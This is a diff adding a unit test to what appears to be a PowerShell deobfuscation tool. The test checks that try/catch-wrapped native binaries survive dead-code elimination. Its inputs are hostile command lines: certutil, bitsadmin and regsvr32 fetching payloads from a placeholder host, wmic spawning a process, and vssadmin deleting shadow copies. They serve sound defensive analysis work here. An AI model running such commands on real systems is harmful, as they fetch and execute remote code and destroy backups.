@@ -400,6 +400,22 @@ class TestPs1DeadCodeExtra(TestPs1):
             "try { Remove-Item foo } catch {}\nWrite-Host 'keep'", Ps1DeadCodeElimination)
         self.assertIn('Remove-Item', result)
 
+    def test_try_wrapped_native_binary_kept(self):
+        # None of these is a cmdlet, so a rule keyed on "the metadata does not know this name"
+        # deleted the whole construct. They are the binaries an attacker reaches for first, and a
+        # `try`/`catch` around one is how a downloader hides its own failure, not a sign of junk.
+        for command in (
+            "certutil -urlcache -split -f 'http://host/payload.exe'",
+            "bitsadmin /transfer j 'http://host/p.exe' C:\\p.exe",
+            "regsvr32 /s /u /i:http://host/f.sct scrobj.dll",
+            "wmic process call create 'calc.exe'",
+            'vssadmin delete shadows /all /quiet',
+        ):
+            with self.subTest(command):
+                result = self._apply(
+                    F"try {{ {command} }} catch {{}}\nWrite-Host 'keep'", Ps1DeadCodeElimination)
+                self.assertIn(command.split()[0], result)
+
     def test_try_nonempty_catch_kept(self):
         result = self._apply(
             "try { foo =5 } catch { Write-Host 'err' }\nWrite-Host 'keep'",
